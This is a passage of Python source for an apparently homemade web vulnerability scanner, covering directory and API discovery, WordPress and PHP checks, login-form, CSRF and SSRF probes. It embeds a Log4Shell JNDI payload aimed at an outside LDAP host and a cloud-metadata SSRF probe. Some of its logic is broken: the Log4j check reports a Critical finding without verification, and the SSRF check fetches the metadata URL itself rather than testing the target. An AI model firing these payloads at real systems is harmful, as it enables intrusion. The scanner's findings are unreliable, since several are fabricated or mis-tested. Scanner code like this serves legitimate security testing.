                            self.results["summary"]["severity_counts"]["High"] += 1
                            
                            self._add_detail_message(f"High severity: Potential SQL injection in parameter '{param}' at {url}", "finding")
                            break  # Found a vulnerability, no need to check other patterns
                    
                    # If we found a vulnerability, no need to try other payloads
                    if any(pattern.lower() in response.text.lower() for pattern in error_patterns):
                        break
                    
                except Exception:
                    # Silently continue on error
                    pass
    
    def _discover_web_directories(self, url):
        """Perform basic directory discovery."""
        common_dirs = [
            "admin", "login", "backup", "wp-admin", "administrator",
            "phpmyadmin", "api", "upload", "images", "img", "css", "js",
            "static", "assets", "config", "dashboard", "dev", "test"
        ]
        
        found_dirs = []
        
        for directory in common_dirs:
            try:
                test_url = urljoin(url, directory)
                headers = {"User-Agent": random.choice(USER_AGENTS)}
                response = requests.get(test_url, headers=headers, timeout=self.timeout, verify=False)
                
                if response.status_code < 404:  # 200, 301, 302, etc.
                    found_dirs.append({
                        "url": test_url,
                        "status_code": response.status_code,
                        "content_length": len(response.content)
                    })
                    self._add_detail_message(f"Found directory: {test_url} (Status: {response.status_code})", "finding")
                    
                    # Check for sensitive admin interfaces
                    if directory in ["admin", "wp-admin", "administrator", "phpmyadmin", "dashboard"]:
                        vuln = {
                            "type": "admin_interface",
                            "url": test_url,
                            "severity": "Medium",
                            "details": f"Potential admin interface discovered at {test_url}"
                        }
                        self.results["web_assessment"]["webapp_vulnerabilities"].append(vuln)
                        self.results["summary"]["total_vulnerabilities"] += 1
                        self.results["summary"]["severity_counts"]["Medium"] += 1
            
            except Exception:
                # Silently continue on error
                pass
        
        self.results["web_assessment"]["directories"] = found_dirs
    
    def _run_advanced_web_assessment(self):
        """Perform advanced web application assessment."""
        self._update_progress(40, "Advanced web assessment")
        self.modules_status["Advanced Web Assessment"] = "In Progress"
        self._add_detail_message("Starting advanced web assessment", "info")
        
        try:
            # Find all web services
            web_endpoints = []
            for service in self.results["network_assessment"]["services"]:
                if service["service"] in ["http", "https"]:
                    protocol = service["service"]
                    port = service["port"]
                    if self.target_hostname:
                        url = f"{protocol}://{self.target_hostname}:{port}"
                        web_endpoints.append(url)
                    url = f"{protocol}://{self.target_ip}:{port}"
                    if url not in web_endpoints:
                        web_endpoints.append(url)
            
            if not web_endpoints:
                self._add_detail_message("No web services found for advanced assessment", "warning")
                self.modules_status["Advanced Web Assessment"] = "Complete"
                return
            
            # Advanced assessment for each web endpoint
            total_endpoints = len(web_endpoints)
            for i, url in enumerate(web_endpoints):
                progress_percentage = 40 + ((i / total_endpoints) * 10)
                self._update_progress(progress_percentage, f"Advanced web assessment ({i+1}/{total_endpoints}): {url}")
                
                # Check for known vulnerabilities based on detected technologies
                if url in self.results["web_assessment"]["server_information"]:
                    self._check_tech_vulnerabilities(url)
                
                # Check for authentication issues
                self._check_auth_vulnerabilities(url)
                
                # API endpoint discovery
                self._discover_api_endpoints(url)
                
                # Check for CSRF
                self._check_csrf_vulnerability(url)
                
                # Check for SSRF
                self._check_ssrf_vulnerability(url)
            
            self._add_detail_message("Advanced web assessment complete", "success")
            self.modules_status["Advanced Web Assessment"] = "Complete"
            
        except Exception as e:
            self._add_detail_message(f"Error during advanced web assessment: {e}", "error")
            self.modules_status["Advanced Web Assessment"] = "Failed"
            raise
    
    def _check_tech_vulnerabilities(self, url):
        """Check for vulnerabilities in detected technologies."""
        if url not in self.results["web_assessment"]["server_information"]:
            return
        
        server_info = self.results["web_assessment"]["server_information"][url]
        server_header = server_info.get("server", "")
        technologies = server_info.get("technologies", [])
        
        # Check for outdated server versions
        if "Apache" in server_header and re.search(r'Apache/2\.[0-3]\.', server_header):
            vuln = {
                "type": "outdated_apache",
                "url": url,
                "severity": "Medium",
                "details": f"Outdated Apache version detected: {server_header}"
            }
            self.results["web_assessment"]["webapp_vulnerabilities"].append(vuln)
            self.results["summary"]["total_vulnerabilities"] += 1
            self.results["summary"]["severity_counts"]["Medium"] += 1
            self._add_detail_message(f"Medium severity: Outdated Apache detected at {url}", "finding")
        
        elif "nginx" in server_header.lower() and re.search(r'nginx/1\.[0-9]\.', server_header):
            vuln = {
                "type": "outdated_nginx",
                "url": url,
                "severity": "Medium",
                "details": f"Potentially outdated Nginx version detected: {server_header}"
            }
            self.results["web_assessment"]["webapp_vulnerabilities"].append(vuln)
            self.results["summary"]["total_vulnerabilities"] += 1
            self.results["summary"]["severity_counts"]["Medium"] += 1
            self._add_detail_message(f"Medium severity: Outdated Nginx detected at {url}", "finding")
        
        # Check for WordPress vulnerabilities
        if "WordPress" in technologies:
            self._check_wordpress_vulnerabilities(url)
        
        # Check for PHP vulnerabilities
        if "PHP" in technologies:
            self._check_php_vulnerabilities(url)
        
        # Simplified Log4j check (would be more sophisticated in a real scanner)
        self._check_log4j_vulnerability(url)
    
    def _check_wordpress_vulnerabilities(self, url):
        """Check for common WordPress vulnerabilities."""
        try:
            # Check for WordPress version in source code
            headers = {"User-Agent": random.choice(USER_AGENTS)}
            response = requests.get(url, headers=headers, timeout=self.timeout, verify=False)
            
            # Look for version in meta generator tag
            version_match = re.search(r'<meta.*?content="WordPress ([0-9.]+)"', response.text)
            if version_match:
                wp_version = version_match.group(1)
                
                # Check if it's a vulnerable version (simplified)
                if wp_version.startswith("4.") or wp_version.startswith("3.") or wp_version.startswith("2."):
                    vuln = {
                        "type": "outdated_wordpress",
                        "url": url,
                        "severity": "High",
                        "details": f"Outdated WordPress version detected: {wp_version}"
                    }
                    self.results["web_assessment"]["webapp_vulnerabilities"].append(vuln)
                    self.results["summary"]["total_vulnerabilities"] += 1
                    self.results["summary"]["severity_counts"]["High"] += 1
                    self._add_detail_message(f"High severity: Outdated WordPress v{wp_version} at {url}", "finding")
            
            # Check for vulnerable plugins (simplified)
            plugin_paths = [
                "wp-content/plugins/contact-form-7/",
                "wp-content/plugins/woocommerce/",
                "wp-content/plugins/elementor/",
                "wp-content/plugins/akismet/"
            ]
            
            for plugin_path in plugin_paths:
                try:
                    plugin_url = urljoin(url, plugin_path)
                    plugin_response = requests.get(plugin_url, headers=headers, timeout=self.timeout, verify=False)
                    
                    if plugin_response.status_code == 200:
                        plugin_name = plugin_path.split("/")[-2]
                        self._add_detail_message(f"WordPress plugin detected: {plugin_name}", "finding")
                except Exception:
                    pass
            
            # Check for xmlrpc.php
            xmlrpc_url = urljoin(url, "xmlrpc.php")
            try:
                xmlrpc_response = requests.get(xmlrpc_url, headers=headers, timeout=self.timeout, verify=False)
                
                if xmlrpc_response.status_code == 200 and "XML-RPC server accepts POST requests only" in xmlrpc_response.text:
                    vuln = {
                        "type": "xmlrpc_enabled",
                        "url": xmlrpc_url,
                        "severity": "Medium",
                        "details": "XML-RPC interface enabled, potentially allowing brute force attacks"
                    }
                    self.results["web_assessment"]["webapp_vulnerabilities"].append(vuln)
                    self.results["summary"]["total_vulnerabilities"] += 1
                    self.results["summary"]["severity_counts"]["Medium"] += 1
                    self._add_detail_message(f"Medium severity: XML-RPC enabled at {url}", "finding")
            except Exception:
                pass
            
        except Exception as e:
            if self.verbosity > 1:
                self._add_detail_message(f"Error checking WordPress vulnerabilities: {str(e)}", "error")
    
    def _check_php_vulnerabilities(self, url):
        """Check for PHP-related vulnerabilities."""
        try:
            # Check for exposed PHP files
            php_files = ["info.php", "phpinfo.php", "test.php", "i.php", "php_info.php"]
            
            for php_file in php_files:
                try:
                    php_url = urljoin(url, php_file)
                    headers = {"User-Agent": random.choice(USER_AGENTS)}
                    response = requests.get(php_url, headers=headers, timeout=self.timeout, verify=False)
                    
                    if response.status_code == 200 and ("phpinfo()" in response.text or "PHP Version" in response.text):
                        vuln = {
                            "type": "phpinfo_exposure",
                            "url": php_url,
                            "severity": "Medium",
                            "details": "PHPInfo page exposed revealing server configuration"
                        }
                        self.results["web_assessment"]["webapp_vulnerabilities"].append(vuln)
                        self.results["summary"]["total_vulnerabilities"] += 1
                        self.results["summary"]["severity_counts"]["Medium"] += 1
                        self._add_detail_message(f"Medium severity: PHPInfo exposed at {php_url}", "finding")
                        
                        # Extract PHP version from the page
                        version_match = re.search(r'PHP Version ([0-9.]+)', response.text)
                        if version_match:
                            php_version = version_match.group(1)
                            
                            # Check if it's a vulnerable version (simplified)
                            if php_version.startswith("5.") or php_version.startswith("4."):
                                vuln = {
                                    "type": "outdated_php",
                                    "url": php_url,
                                    "severity": "High",
                                    "details": f"Outdated PHP version detected: {php_version}"
                                }
                                self.results["web_assessment"]["webapp_vulnerabilities"].append(vuln)
                                self.results["summary"]["total_vulnerabilities"] += 1
                                self.results["summary"]["severity_counts"]["High"] += 1
                                self._add_detail_message(f"High severity: Outdated PHP v{php_version} at {url}", "finding")
                except Exception:
                    pass
            
        except Exception as e:
            if self.verbosity > 1:
                self._add_detail_message(f"Error checking PHP vulnerabilities: {str(e)}", "error")
    
    def _check_log4j_vulnerability(self, url):
        """Check for Log4j vulnerability (CVE-2021-44228)."""
        # This is a simplified implementation - real scanners would use a callback server
        try:
            headers = {
                "User-Agent": "${jndi:ldap://log4j-test-value.com/exploit}",
                "X-Api-Version": "${jndi:ldap://log4j-test-value.com/exploit}",
                "Referer": "${jndi:ldap://log4j-test-value.com/exploit}"
            }
            
            # Add the payload to potential URL parameters
            parsed_url = urlparse(url)
            if parsed_url.query:
                params = parse_qs(parsed_url.query)
                for param in params:
                    params[param] = ["${jndi:ldap://log4j-test-value.com/exploit}"]
                
                query_string = "&".join(f"{k}={requests.utils.quote(v[0])}" for k, v in params.items())
                test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{query_string}"
            else:
                test_url = url
            
            # Send request with potentially vulnerable headers and parameters
            requests.get(test_url, headers=headers, timeout=self.timeout, verify=False)
            
            # In a real scanner, we would check for callbacks to our server
            # Here, we just add a note that the test was performed
            self._add_detail_message(f"Log4j (Log4Shell) test performed on {url}", "info")
            
            # For demonstration, add a "potential" finding (this would normally depend on the callback)
            if self.assessment_type == "pentest":
                vuln = {
                    "type": "potential_log4j",
                    "url": url,
                    "severity": "Critical",
                    "details": "Potential Log4j vulnerability (CVE-2021-44228) - verification required"
                }
                self.results["web_assessment"]["webapp_vulnerabilities"].append(vuln)
                self.results["summary"]["total_vulnerabilities"] += 1
                self.results["summary"]["severity_counts"]["Critical"] += 1
                self._add_detail_message(f"Note: Log4j (Log4Shell) verification requires manual review", "finding")
        
        except Exception as e:
            if self.verbosity > 1:
                self._add_detail_message(f"Error during Log4j test: {str(e)}", "error")
    
    def _check_auth_vulnerabilities(self, url):
        """Check for authentication-related vulnerabilities."""
        # Look for login forms
        try:
            login_paths = ["login", "signin", "admin", "user/login", "wp-login.php", "administrator", "auth"]
            
            for path in login_paths:
                try:
                    login_url = urljoin(url, path)
                    headers = {"User-Agent": random.choice(USER_AGENTS)}
                    response = requests.get(login_url, headers=headers, timeout=self.timeout, verify=False)
                    
                    if response.status_code == 200 and ("<form" in response.text.lower() and 
                                                      ("password" in response.text.lower() or 
                                                       "login" in response.text.lower() or 
                                                       "signin" in response.text.lower())):
                        self._add_detail_message(f"Login form found at {login_url}", "finding")
                        
                        # Check if HTTPS is used for the login form
                        if login_url.startswith("http://"):
                            vuln = {
                                "type": "cleartext_login",
                                "url": login_url,
                                "severity": "High",
                                "details": "Login form submitted over unencrypted HTTP connection"
                            }
                            self.results["web_assessment"]["authentication_issues"].append(vuln)
                            self.results["summary"]["total_vulnerabilities"] += 1
                            self.results["summary"]["severity_counts"]["High"] += 1
                            self._add_detail_message(f"High severity: Login form using insecure HTTP at {login_url}", "finding")
                        
                        # Check for autocomplete attribute on password fields
                        if 'password' in response.text.lower() and not re.search(r'autocomplete=["\']off["\']', response.text.lower()):
                            vuln = {
                                "type": "password_autocomplete",
                                "url": login_url,
                                "severity": "Low",
                                "details": "Password field missing autocomplete='off' attribute"
                            }
                            self.results["web_assessment"]["authentication_issues"].append(vuln)
                            self.results["summary"]["total_vulnerabilities"] += 1
                            self.results["summary"]["severity_counts"]["Low"] += 1
                            self._add_detail_message(f"Low severity: Password autocomplete not disabled at {login_url}", "finding")
                except Exception:
                    pass
            
        except Exception as e:
            if self.verbosity > 1:
                self._add_detail_message(f"Error checking authentication vulnerabilities: {str(e)}", "error")
    
    def _discover_api_endpoints(self, url):
        """Attempt to discover API endpoints."""
        api_paths = [
            "api", "api/v1", "api/v2", "rest", "graphql", "query", 
            "service", "services", "wp-json", "api/swagger", "swagger",
            "openapi.json", "api-docs", "docs"
        ]
        
        for path in api_paths:
            try:
                api_url = urljoin(url, path)
                headers = {"User-Agent": random.choice(USER_AGENTS)}
                response = requests.get(api_url, headers=headers, timeout=self.timeout, verify=False)
                
                if response.status_code < 404:  # 200, 201, 301, 302, etc.
                    # Check if the response is JSON
                    is_json = False
                    content_type = response.headers.get('Content-Type', '')
                    if 'application/json' in content_type or 'application/ld+json' in content_type:
                        is_json = True
                    else:
                        try:
                            json.loads(response.text)
                            is_json = True
                        except:
                            pass
                    
                    # Store the API endpoint
                    self.results["web_assessment"]["api_endpoints"].append({
                        "url": api_url,
                        "status_code": response.status_code,
                        "content_type": content_type,
                        "is_json": is_json
                    })
                    
                    self._add_detail_message(f"Potential API endpoint found: {api_url}", "finding")
                    
                    # If it looks like a Swagger/OpenAPI endpoint, log it
                    if "swagger" in path or "openapi" in path or "api-docs" in path:
                        if is_json or "swagger-ui" in response.text:
                            vuln = {
                                "type": "api_docs_exposed",
                                "url": api_url,
                                "severity": "Medium",
                                "details": "API documentation exposed, may reveal sensitive endpoints or operations"
                            }
                            self.results["web_assessment"]["webapp_vulnerabilities"].append(vuln)
                            self.results["summary"]["total_vulnerabilities"] += 1
                            self.results["summary"]["severity_counts"]["Medium"] += 1
                            self._add_detail_message(f"API documentation exposed at {api_url}", "finding")
                
            except Exception as e:
                if self.verbosity > 1:
                    self._add_detail_message(f"Error discovering API endpoint at {api_url}: {str(e)}", "error")
    
    def _check_csrf_vulnerability(self, url):
        """Check for Cross-Site Request Forgery (CSRF) vulnerabilities."""
        try:
            # Check for common CSRF vulnerability by looking for unprotected forms
            csrf_paths = ["login", "settings", "user", "admin"]
            for path in csrf_paths:
                try:
                    csrf_url = urljoin(url, path)
                    headers = {"User-Agent": random.choice(USER_AGENTS)}
                    response = requests.get(csrf_url, headers=headers, timeout=self.timeout, verify=False)

                    # Check for forms that lack anti-CSRF tokens
                    if response.status_code == 200 and "<form" in response.text.lower():
                        if "csrf" not in response.text.lower():  # Simplified check
                            vuln = {
                                "type": "csrf_vulnerability",
                                "url": csrf_url,
                                "severity": "Medium",
                                "details": f"Possible CSRF vulnerability found at {csrf_url} (missing anti-CSRF token)"
                            }
                            self.results["web_assessment"]["webapp_vulnerabilities"].append(vuln)
                            self.results["summary"]["total_vulnerabilities"] += 1
                            self.results["summary"]["severity_counts"]["Medium"] += 1
                            self._add_detail_message(f"Medium severity: CSRF vulnerability found at {csrf_url}", "finding")
                except Exception as e:
                    self._add_detail_message(f"Error checking CSRF vulnerability at {csrf_url}: {str(e)}", "error")
        
        except Exception as e:
            if self.verbosity > 1:
                self._add_detail_message(f"Error during CSRF vulnerability check: {str(e)}", "error")
    
    def _check_ssrf_vulnerability(self, url):
        """Check for Server-Side Request Forgery (SSRF) vulnerabilities."""
        try:
            # Test if server makes unauthorized requests
            ssrf_test_payload = "http://169.254.169.254/latest/meta-data/"
            test_url = urljoin(url, ssrf_test_payload)
            headers = {"User-Agent": random.choice(USER_AGENTS)}
            response = requests.get(test_url, headers=headers, timeout=self.timeout, verify=False)

            if response.status_code == 200:
                vuln = {
                    "type": "ssrf_vulnerability",
                    "url": test_url,
                    "severity": "Critical",
                    "details": f"SSRF vulnerability detected at {test_url}. The server can access metadata."
                }
                self.results["web_assessment"]["webapp_vulnerabilities"].append(vuln)
                self.results["summary"]["total_vulnerabilities"] += 1
                self.results["summary"]["severity_counts"]["Critical"] += 1
                self._add_detail_message(f"Critical severity: SSRF vulnerability detected at {test_url}", "finding")
        except Exception as e:
            self._add_detail_message(f"Error checking SSRF vulnerability at {test_url}: {str(e)}", "error")
    
    def _generate_report(self):
        """Generate a report of the security assessment findings."""
        report_filename = os.path.join(self.output_dir, f"assessment_report_{self.assessment_id}.json")
        
        try:
            with open(report_filename, 'w') as report_file:
                json.dump(self.results, report_file, indent=4)
            self._add_detail_message(f"Assessment report generated at {report_filename}", "success")
        except Exception as e:
            self._add_detail_message(f"Error generating report: {str(e)}", "error")
    
    def _display_assessment_summary(self):
        """Display the summary of the security assessment."""
        summary = self.results["summary"]
        
        # Display vulnerabilities summary
        total_vulnerabilities = summary["total_vulnerabilities"]
        severity_counts = summary["severity_counts"]
        scan_duration = summary["scan_duration"]
        
        self._add_detail_message(f"Assessment completed in {scan_duration} seconds.", "info")
        self._add_detail_message(f"Total vulnerabilities found: {total_vulnerabilities}", "info")
        
        for severity, count in severity_counts.items():
            self._add_detail_message(f"{severity} vulnerabilities: {count}", "info")
        
        # Generate the final summary output for the console
        self.console.print("\n[bold]Assessment Summary[/bold]", style="green")
        self.console.print(f"Total vulnerabilities: {total_vulnerabilities}", style="yellow")
        for severity, count in severity_counts.items():
            self.console.print(f"{severity}: {count}", style="yellow")
        
        self.console.print("\n[bold]Assessment Completed[/bold]", style="blue")
    
    def _add_detail_message(self, message, message_type="info"):
        """Add a message to the details panel."""
        # Type can be "info", "warning", "error", "success"
        style_map = {
            "info": "blue",
            "warning": "yellow",
            "error": "red",
            "success": "green",
            "finding": "magenta"
        }
        
        # Get existing content
        content = self.details_panel.renderable
        if isinstance(content, str):
            content = Text(content)
        
        # Append new message
        timestamp = datetime.now().strftime("%H:%M:%S")
        content.append(f"\n[{timestamp}] ")
        content.append(message, style=style_map.get(message_type, "white"))
        
        # Update the panel
        self.layout["details"].update(Panel(content, title="Details", border_style="green"))

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Enterprise Network Security Suite")
    parser.add_argument('--target', type=str, help='Target URL or IP address')
    parser.add_argument('--assessment-type', type=str, default='standard', choices=['standard', 'advanced', 'pentest'], help='Type of assessment')
    args = parser.parse_args()

    # Initialize and run the assessment
    suite = EnterpriseSecuritySuite(target=args.target, assessment_type=args.assessment_type)
    suite.run_assessment()
        